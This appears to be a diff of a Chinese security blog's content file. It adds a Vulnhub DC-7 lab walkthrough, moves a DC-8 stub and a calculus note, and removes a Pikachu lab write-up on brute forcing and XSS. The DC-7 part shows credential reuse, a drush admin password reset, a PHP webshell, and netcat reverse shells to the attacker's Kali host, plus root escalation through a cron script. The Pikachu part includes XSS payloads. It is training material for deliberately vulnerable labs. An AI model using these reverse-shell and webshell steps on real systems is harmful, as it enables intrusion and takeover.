+<p>成功登录</p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先尝试SUID和有无免密的root权限命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/10.png" alt></p>
+<p>但都没有利用点</p>
+<p>那就随便寻找一下有用的信息吧</p>
+<p>然后在用户<code>dc7user</code>目录中发现<code>backups</code>目录和<code>mbox</code>文件，先进入backups，发现都是<code>gpg</code>文件<em>（靶机里是没有html目录的，为什么会有html目录，后面我会提）</em>，<code>gpg</code>文件是一种加密格式，直接打开的话是一串乱码，而且解密还需要密钥，因此暂时没什么帮助</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/11.png" alt></p>
+<p>那就看一下旁边的<code>mbox</code>文件，打开后发现这似乎是管理员（root）的计划任务，会在一定时间后自动执行<code>/opt/scripts/backups.sh</code>文件，还是以root的权限运行</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/12.png" alt></p>
+<p>那么思路就清楚了，如果我们可以对这个脚本文件有修改的权限，那么就可以写入反弹root权限shell的内容了，就能得到root权限了</p>
+<p>那么就查看一下这个文件的权限吧</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/13.png" alt></p>
+<p>可以看到我们当前用户并不能对其写入内容，但还是看一下这个文件里有什么内容吧</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/14.png" alt></p>
+<p>大部分命令都能够明白，其中有两个命令值得注意:<code>drush</code>和<code>gpg</code>，很明显，这个加密的密钥已经能看到了，就是<code>PickYourOwnPassword</code></p>
+<blockquote>
+<p>然后我回去尝试对其解密，解密成功后将其解压，解压出来后发现就是一个<code>html</code>的文件夹，里面并没什么有用的内容，也许是网站站点的一些源码吧</p>
+</blockquote>
+<p>无果后回来研究这个<code>drush</code>命令，发现这个命令是<code>drupal</code>用来管理数据库的</p>
+<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令</a></p>
+<p>然后还发现这个命令可以修改密码</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/15.png" alt></p>
+<p>那我们就跟着这个脚本文件来到<code>/var/www/html/</code>目录，然后修改密码，第一次尝试修改root用户的密码，发现并不能修改，那就修改默认用户admin的密码试试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">drush upwd admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/16.png" alt></p>
+<p>成功修改admin用户密码，后台尝试登录成功</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/17.png" alt></p>
+<p>然后在网站中寻找信息，发现在<code>Content → Add content → Basic page</code>中似乎可以写码，但并没有php的选项</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/18.png" alt></p>
+<p>然后去网上搜索相关信息“drupal 8 PHP”，在drupal官方中找到了解释：<a href="https://www.drupal.org/node/2088811">PHP Filter module removed from Drupal core</a></p>
+<blockquote>
+<p>PHP Filter模块已从Drupal Core中删除，并移至 <a href="http://drupal.org/project/php">http://drupal.org/project/php</a> 的一个贡献模块</p>
+</blockquote>
+<p>原来是官方出于安全考虑，将PHP Filter模块移除，但可以作为一个模块（module）手动安装</p>
+<p>那就跟着官方给的方法，将PHP模块下载下来</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/19.png" alt></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/20.png" alt></p>
+<p>然后回到网站进行安装：<code>Extend → Install new module</code></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/21.png" alt></p>
+<p>安装完成后点击启用</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/22.png" alt></p>
+<p>按提示成功启用<code>PHP Filter</code>模块后回到刚刚写码的地方，Text format选择<code>PHP code</code>，然后写入一句话即可</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/23.png" alt></p>
+<p>然后复制链接地址，打开蚁剑进行连接</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/24.png" alt></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/25.png" alt></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>连接成功后进入虚拟终端反弹shell</p>
+<p>kali：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+<p>蚁剑虚拟终端：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.11.132 2222</span><br></pre></td></tr></table></figure>
+<p>改为交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/26.png" alt></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然后就是写入反弹shell代码进入<code>backups.sh</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.11.132 3333&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/27.png" alt></p>
+<p>然后在kali中监听</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>
+<p>然后就是等待这个计划任务的进行，因为执行这个脚本文件的权限是root权限，那么反弹回来的权限自然也是root权限</p>
+<p>成功连接后就能找到flag</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/28.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123683318?spm=1001.2014.3001.5502">dc-7 靶机渗透学习</a></p>
+<p><a href="https://blog.csdn.net/weixin_44214107/article/details/101123371">DC：7靶机-Walkthrough</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令 - 知乎 (zhihu.com)</a></p>
+<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">使用 GPG 加密和解密文件 | 《Linux就该这么学》 (linuxprobe.com)</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>靶机</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vulnhub-DC-6渗透学习</title>
     <url>/2022/08/12/Vulnhub-DC-6/</url>
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
@@ -867,117 +989,18 @@
       </tags>
   </entry>
   <entry>
-    <title>Vulnhub-DC-7渗透学习</title>
-    <url>/2022/08/14/Vulnhub-DC-7/</url>
+    <title>Vulnhub-DC-8渗透学习</title>
+    <url>/2022/08/24/Vulnhub-DC-8/</url>
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
 <p>攻击机：Kali-2021.3：192.168.11.132</p>
-<p>靶机：Vulnhub-DC-7：192.168.11.141</p>
+<p>靶机：Vulnhub-DC-8：192.168.11.142</p>
 </blockquote>
 <h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.1-255</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/1.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Vulnhub-DC-8/1.png" alt></p>
 <p>扫描目标端口</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.141</span><br></pre></td></tr></table></figure>
-<p>同时也知道了这个网站的CMS是<code>Drupal 8</code></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/2.png" alt></p>
-<p>既然知道了CMS，那就去看看有没有什么漏洞可以利用</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit drupal 8</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/3.png" alt></p>
-<p>我尝试了几个，但都没有什么结果</p>
-<p>接着我又用<code>msf</code>尝试一下</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/4.png" alt></p>
-<p>但也是一样的结果，没有什么利用的上的</p>
-<p>那就说明这个靶机不是按照正常套路来的，那就直接访问一下看看，访问之后发现有作者给出的线索</p>
-<blockquote>
-<p>DC-7 引入了一些“新”概念，但我会让你弄清楚它们是什么。 :-)</p>
-<p>虽然这个挑战并不完全是技术性的，但如果您需要诉诸暴力破解或字典攻击，您可能不会成功。</p>
-<p>你要做的，就是跳出框框思考。</p>
-<p>方式“外”框。 :-)</p>
-</blockquote>
-<p>作者告诉我们思维不要被限制，那就来看看这个网站的特点吧</p>
-<p>在这个页面的footer也就是页脚处发现一个看起来并不正常的东西</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/5.png" alt></p>
-<p>直接复制去必应搜索一下，搜索后发现有个Github账号</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/6.png" alt></p>
-<p>进入后发现他有个项目：<code>staffdb</code></p>
-<p>进入这个项目中，在<code>config.php</code>中发现了一个账户和密码</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/7.png" alt></p>
-<blockquote>
-<p>dc7user / MdR3xOgB7#dW</p>
-</blockquote>
-<p>尝试登录网站后台，但是无论尝试几次，依然是错误的</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/8.png" alt></p>
-<p>难道这个是靶场的账号密码吗，想起刚刚开放了22端口，尝试ssh登录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh dc7user@192.168.11.141</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/9.png" alt></p>
-<p>成功登录</p>
-<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先尝试SUID和有无免密的root权限命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/10.png" alt></p>
-<p>但都没有利用点</p>
-<p>那就随便寻找一下有用的信息吧</p>
-<p>然后在用户<code>dc7user</code>目录中发现<code>backups</code>目录和<code>mbox</code>文件，先进入backups，发现都是<code>gpg</code>文件<em>（靶机里是没有html目录的，为什么会有html目录，后面我会提）</em>，<code>gpg</code>文件是一种加密格式，直接打开的话是一串乱码，而且解密还需要密钥，因此暂时没什么帮助</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/11.png" alt></p>
-<p>那就看一下旁边的<code>mbox</code>文件，打开后发现这似乎是管理员（root）的计划任务，会在一定时间后自动执行<code>/opt/scripts/backups.sh</code>文件，还是以root的权限运行</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/12.png" alt></p>
-<p>那么思路就清楚了，如果我们可以对这个脚本文件有修改的权限，那么就可以写入反弹root权限shell的内容了，就能得到root权限了</p>
-<p>那么就查看一下这个文件的权限吧</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/13.png" alt></p>
-<p>可以看到我们当前用户并不能对其写入内容，但还是看一下这个文件里有什么内容吧</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/14.png" alt></p>
-<p>大部分命令都能够明白，其中有两个命令值得注意:<code>drush</code>和<code>gpg</code>，很明显，这个加密的密钥已经能看到了，就是<code>PickYourOwnPassword</code></p>
-<blockquote>
-<p>然后我回去尝试对其解密，解密成功后将其解压，解压出来后发现就是一个<code>html</code>的文件夹，里面并没什么有用的内容，也许是网站站点的一些源码吧</p>
-</blockquote>
-<p>无果后回来研究这个<code>drush</code>命令，发现这个命令是<code>drupal</code>用来管理数据库的</p>
-<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令</a></p>
-<p>然后还发现这个命令可以修改密码</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/15.png" alt></p>
-<p>那我们就跟着这个脚本文件来到<code>/var/www/html/</code>目录，然后修改密码，第一次尝试修改root用户的密码，发现并不能修改，那就修改默认用户admin的密码试试</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">drush upwd admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/16.png" alt></p>
-<p>成功修改admin用户密码，后台尝试登录成功</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/17.png" alt></p>
-<p>然后在网站中寻找信息，发现在<code>Content → Add content → Basic page</code>中似乎可以写码，但并没有php的选项</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/18.png" alt></p>
-<p>然后去网上搜索相关信息“drupal 8 PHP”，在drupal官方中找到了解释：<a href="https://www.drupal.org/node/2088811">PHP Filter module removed from Drupal core</a></p>
-<blockquote>
-<p>PHP Filter模块已从Drupal Core中删除，并移至 <a href="http://drupal.org/project/php">http://drupal.org/project/php</a> 的一个贡献模块</p>
-</blockquote>
-<p>原来是官方出于安全考虑，将PHP Filter模块移除，但可以作为一个模块（module）手动安装</p>
-<p>那就跟着官方给的方法，将PHP模块下载下来</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/19.png" alt></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/20.png" alt></p>
-<p>然后回到网站进行安装：<code>Extend → Install new module</code></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/21.png" alt></p>
-<p>安装完成后点击启用</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/22.png" alt></p>
-<p>按提示成功启用<code>PHP Filter</code>模块后回到刚刚写码的地方，Text format选择<code>PHP code</code>，然后写入一句话即可</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/23.png" alt></p>
-<p>然后复制链接地址，打开蚁剑进行连接</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/24.png" alt></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/25.png" alt></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>连接成功后进入虚拟终端反弹shell</p>
-<p>kali：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<p>蚁剑虚拟终端：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.11.132 2222</span><br></pre></td></tr></table></figure>
-<p>改为交互式shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/26.png" alt></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然后就是写入反弹shell代码进入<code>backups.sh</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.11.132 3333&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/27.png" alt></p>
-<p>然后在kali中监听</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>
-<p>然后就是等待这个计划任务的进行，因为执行这个脚本文件的权限是root权限，那么反弹回来的权限自然也是root权限</p>
-<p>成功连接后就能找到flag</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/28.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123683318?spm=1001.2014.3001.5502">dc-7 靶机渗透学习</a></p>
-<p><a href="https://blog.csdn.net/weixin_44214107/article/details/101123371">DC：7靶机-Walkthrough</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令 - 知乎 (zhihu.com)</a></p>
-<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">使用 GPG 加密和解密文件 | 《Linux就该这么学》 (linuxprobe.com)</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.142</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Vulnhub-DC-8/2.png" alt></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
@@ -1475,26 +1498,17 @@
       </tags>
   </entry>
   <entry>
-    <title>Vulnhub-DC-8渗透学习</title>
-    <url>/2022/08/24/Vulnhub-DC-8/</url>
-    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
-<p>攻击机：Kali-2021.3：192.168.11.132</p>
-<p>靶机：Vulnhub-DC-8：192.168.11.142</p>
-</blockquote>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Vulnhub-DC-8/1.png" alt></p>
-<p>扫描目标端口</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.142</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Vulnhub-DC-8/2.png" alt></p>
-]]></content>
+    <title>求斜渐近线</title>
+    <url>/2022/01/10/math/</url>
+    <content><![CDATA[<script type="math/tex; mode=display">
+如果\lim\limits_{n \to \infty} [f(x)-kx-b]=0，则y=kx+b是曲线的斜渐近线</script><hr>
+<script type="math/tex; mode=display">
+求法：\lim\limits_{n \to \infty} \cfrac{f(x)}{x} = k，且\lim\limits_{n \to \infty} f(x)-kx=b，斜渐近线为y=kx+b</script>]]></content>
       <categories>
-        <category>靶场&amp;靶机</category>
+        <category>高数笔记</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>靶机</tag>
-        <tag>渗透测试</tag>
+        <tag>math</tag>
       </tags>
   </entry>
   <entry>
@@ -1556,20 +1570,6 @@
 </li>
 </ol>
 ]]></content>
-  </entry>
-  <entry>
-    <title>求斜渐近线</title>
-    <url>/2022/01/10/math/</url>
-    <content><![CDATA[<script type="math/tex; mode=display">
-如果\lim\limits_{n \to \infty} [f(x)-kx-b]=0，则y=kx+b是曲线的斜渐近线</script><hr>
-<script type="math/tex; mode=display">
-求法：\lim\limits_{n \to \infty} \cfrac{f(x)}{x} = k，且\lim\limits_{n \to \infty} f(x)-kx=b，斜渐近线为y=kx+b</script>]]></content>
-      <categories>
-        <category>高数笔记</category>
-      </categories>
-      <tags>
-        <tag>math</tag>
-      </tags>
   </entry>
   <entry>
     <title>metasploit</title>
@@ -1733,188 +1733,6 @@
       <tags>
         <tag>web</tag>
         <tag>复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pikachu</title>
-    <url>/2022/04/17/pikachu/</url>
-    <content><![CDATA[<h1 id="一、搭建靶场"><a href="#一、搭建靶场" class="headerlink" title="一、搭建靶场"></a>一、搭建靶场</h1><ol>
-<li>去官网把靶场下载下来，<a href="https://github.com/zhuifengshaonianhanlu/pikachu">链接地址</a></li>
-<li>将下载好的<code>pikachu</code>文件夹到<code>phpstudy</code>的<code>www</code>目录下</li>
-<li>到<code>pikachu/inc/config.inc.php</code>中更改数据库连接的账号和密码</li>
-<li>访问<code>localhost/pikachu/index.php</code>进行初始化安装</li>
-<li>安装完成后即可访问开干</li>
-</ol>
-<h1 id="二、暴力破解"><a href="#二、暴力破解" class="headerlink" title="二、暴力破解"></a>二、暴力破解</h1><h2 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h2><p><strong>Burte Force（暴力破解）概述</strong></p>
-<p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。            其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。        </p>
-<p>  理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。这里的认证安全策略, 包括：</p>
-<ol>
-<li>是否要求用户设置复杂的密码</li>
-<li>是否每次认证都是用安全的验证码或者手机otp</li>
-<li>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）</li>
-<li>是否采用了双因素认证</li>
-<li>…</li>
-</ol>
-<h2 id="2、基于表单的暴力破解"><a href="#2、基于表单的暴力破解" class="headerlink" title="2、基于表单的暴力破解"></a>2、基于表单的暴力破解</h2><p>一个简单的登陆界面，既没有验证码也没有对登陆的行为进行限制</p>
-<p><img src="/2022/04/17/pikachu/1.png" alt></p>
-<p>直接扔Burp里爆破即可</p>
-<p><img src="/2022/04/17/pikachu/2.png" alt></p>
-<h2 id="3、验证码绕过（on-server）"><a href="#3、验证码绕过（on-server）" class="headerlink" title="3、验证码绕过（on server）"></a>3、验证码绕过（on server）</h2><p>burp抓包，放入<code>repeater</code>里<code>go</code>一下，发现并没有报验证码错误</p>
-<p><img src="/2022/04/17/pikachu/3.png" alt></p>
-<p>这时我们再<code>go</code>一下，发现还是只报账号密码的错误，并没有报验证码的错误，因此只要我们不刷新页面，该验证码就可以被无限使用</p>
-<p><img src="/2022/04/17/pikachu/4.png" alt></p>
-<p>那就直接放burp爆破即可</p>
-<p><img src="/2022/04/17/pikachu/5.png" alt></p>
-<h2 id="4、验证码绕过（on-client）"><a href="#4、验证码绕过（on-client）" class="headerlink" title="4、验证码绕过（on client）"></a>4、验证码绕过（on client）</h2><p>burp抓包后放入<code>repeater</code>里，发现和上一关一样，并不会报验证码的错误，因此继续直接扔<code>intruder</code>里爆破即可</p>
-<p><img src="/2022/04/17/pikachu/6.png" alt></p>
-<p>但这里其实是有一个<code>js</code>用来生成验证码</p>
-<p><img src="/2022/04/17/pikachu/7.png" alt></p>
-<p>所以我们只需要将<code>js</code>移除即可</p>
-<ol>
-<li><p>在浏览器控制台将<code>js</code>禁用</p>
-<p><img src="/2022/04/17/pikachu/8.png" alt></p>
-</li>
-<li><p>在burp代理<code>proxy</code>模块的设置里，<code>Response Modification</code>中勾选<code>Remove all Javascript</code>选项，将所有<code>js</code>移除</p>
-</li>
-</ol>
-<p>将<code>js</code>关闭后，刷新页面即可发现验证码没有了</p>
-<p><img src="/2022/04/17/pikachu/9.png" alt></p>
-<p>然后再进行爆破即可</p>
-<h2 id="5、token验证"><a href="#5、token验证" class="headerlink" title="5、token验证"></a>5、token验证</h2><p>burp抓包发现有个<code>token</code>值</p>
-<blockquote>
-<p>Token介绍</p>
-<p>1、当前端向服务器端请求认证并成功后，服务器端将会返回一个Token值给前端作为合法身份的令牌</p>
-<p>2、Token可以避免CSRF攻击</p>
-</blockquote>
-<p>分析一下前端的代码可以发现，存在一个隐藏的标签，里面记录了服务端返回的<code>token</code>值，并且和我们抓到的数据的包的<code>token</code>值不一样，因此我们可以推测我们每请求一次服务端，服务端就会返回一个不同的<code>token</code>值来验证我们的身份</p>
-<p><img src="/2022/04/17/pikachu/10.png" alt></p>
-<blockquote>
-<p>解决思路很简单，因为当我们发送请求给服务端之后，服务端就已经给了我们一个新的<code>token</code>值，因此我们需要将这个<code>token</code>值获取出来并在我们的下一次爆破做为身份令牌</p>
-</blockquote>
-<ol>
-<li><p>抓包后放入<code>intruder</code>模块，并将攻击类型（attack type）改为<code>Pitchfork</code>（对每个标记的字段分配不同的字典）</p>
-</li>
-<li><p>接下来设置<code>Payloads</code></p>
-<p>对第一个字段，也就是password字段，设置一个字典</p>
-<p><img src="/2022/04/17/pikachu/11.png" alt></p>
-</li>
-<li><p>然后将<code>Payload set</code>改为2，设置第二个字段，将<code>Payload type</code>改为<code>Recursive grep</code>（递归查找)，然后在<code>options</code>设置里找到<code>Grep - Extract</code>模块，点击<code>Add</code></p>
-<p><img src="/2022/04/17/pikachu/12.png" alt></p>
-</li>
-<li><p>在弹出来的窗口中点击<code>Fetch response</code>，然后找到<code>token</code>的位置，将<code>value</code>值选中并复制（待会有用），然后点OK即可</p>
-<p><img src="/2022/04/17/pikachu/13.png" alt></p>
-</li>
-<li><p>将页面拉到最下面，找到<code>Redirections</code>模块，将<code>Always</code>选上</p>
-<p><img src="/2022/04/17/pikachu/14.png" alt></p>
-</li>
-<li><p>回到<code>Payloads</code>，在<code>Initial payload for first request</code>的值那粘贴刚刚复制的<code>token</code>值</p>
-<p><img src="/2022/04/17/pikachu/15.png" alt></p>
-</li>
-<li><p>最后将线程改为1就可以开始攻击了</p>
-<p><img src="/2022/04/17/pikachu/16.png" alt></p>
-</li>
-</ol>
-<p>结果如下</p>
-<p><img src="/2022/04/17/pikachu/17.png" alt></p>
-<h1 id="三、XSS（跨站脚本漏洞）"><a href="#三、XSS（跨站脚本漏洞）" class="headerlink" title="三、XSS（跨站脚本漏洞）"></a>三、XSS（跨站脚本漏洞）</h1><h2 id="1、概述-1"><a href="#1、概述-1" class="headerlink" title="1、概述"></a>1、概述</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p>
-<ol>
-<li><p>反射型XSS</p>
-<p>交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询类页面</p>
-</li>
-<li><p>存储型XSS</p>
-<p>交互的数据会被存在数据库里面，永久性存储，一般出现在留言板、注册等页面</p>
-</li>
-<li><p>DOM型XSS</p>
-<p>不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性也属于反射性</p>
-</li>
-</ol>
-<ul>
-<li>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</li>
-<li>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。 </li>
-<li>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</li>
-<li>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理：<ol>
-<li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入</li>
-<li>输出转义：根据输出点的位置对输出到前端的内容进行适当转义</li>
-</ol>
-</li>
-</ul>
-<h2 id="2、反射型xss（get）"><a href="#2、反射型xss（get）" class="headerlink" title="2、反射型xss（get）"></a>2、反射型xss（get）</h2><p>将<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>写入，发现有长度限制，但这只是前端的限制，我们只需要在URL上进行修改即可</p>
-<p><img src="/2022/04/17/pikachu/18.png" alt></p>
-<p><img src="/2022/04/17/pikachu/19.png" alt></p>
-<p>攻击成功</p>
-<h2 id="3、反射型xss（post）"><a href="#3、反射型xss（post）" class="headerlink" title="3、反射型xss（post）"></a>3、反射型xss（post）</h2><p>用admin/123456登陆进去后，按照上一关的payload即可成功</p>
-<h2 id="4、存储型xss"><a href="#4、存储型xss" class="headerlink" title="4、存储型xss"></a>4、存储型xss</h2><p>同样将<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>输入，然后每次进入这个页面就会执行一次这个<code>js</code>，这就是存储型，因为存储型xss是保存在数据库里的，如果用户刷新，留言列表会从数据库提取出xss数据弹框</p>
-<h2 id="5、DOM型xss"><a href="#5、DOM型xss" class="headerlink" title="5、DOM型xss"></a>5、DOM型xss</h2><p>将之前的payload输入进去后发现并没有用，F12打开控制台，发现我们填入的内容被引号给转义了</p>
-<p><img src="/2022/04/17/pikachu/20.png" alt></p>
-<p>因此我们要在前面加一个单引号将其闭合，构造payload：<code>&#39;onclick=&quot;alert(1)&gt;&quot;</code>，点击出现的链接即可触发</p>
-<p><img src="/2022/04/17/pikachu/21.png" alt></p>
-<h2 id="6、DOM型xss-x"><a href="#6、DOM型xss-x" class="headerlink" title="6、DOM型xss-x"></a>6、DOM型xss-x</h2><p>这题和上一题是一样的道理</p>
-<p>payload：<code>&#39;onclick=&quot;alert(1)&quot;&gt;</code></p>
-<p><img src="/2022/04/17/pikachu/22.png" alt></p>
-<h2 id="7、xss之盲打"><a href="#7、xss之盲打" class="headerlink" title="7、xss之盲打"></a>7、xss之盲打</h2><blockquote>
-<p><strong>概念</strong></p>
